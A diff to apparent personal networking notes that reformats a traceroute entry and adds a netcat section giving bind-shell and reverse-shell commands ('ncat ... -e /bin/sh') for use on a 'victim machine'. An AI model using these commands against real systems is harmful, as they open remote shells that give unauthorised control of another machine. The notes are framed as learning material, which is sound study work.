@@ -142,9 +142,30 @@ $ dig www.google.com NS		# Name Server
 $ dig @8.8.8.8 www.google.com	# Use a specific DNS server
 $ dig -x 8.8.8.8		# Reverse lookup
 ```
-traceroute - Prints the n/w hop taken to resolve the dns. It figures it out by sending packets with incremental TTL
+traceroute 
+
+Prints the n/w hop taken to resolve the dns. It figures it out by sending packets with incremental TTL
 ```
 $ traceroute www.google.com
+```
+netcat
+bind shell
+
+When you can exploit any port of the victom machine
+```bash
+# On the target, run ncat as server
+$ ncat -lvp 3334 -e /bin/sh
+# On the attack machine
+$ ncat <ip_address> <port> 
+```
+reverse shell
+
+When you can gain entry to one open port but can't use that port as its already being used.
+```bash
+# On the attack box
+$ ncat -lvp 3334
+# On the target machine, start as client as send the shell program over
+$ ncat <ip_address> <port> -e /bin/sh
 ```
 ### Namespaces
 
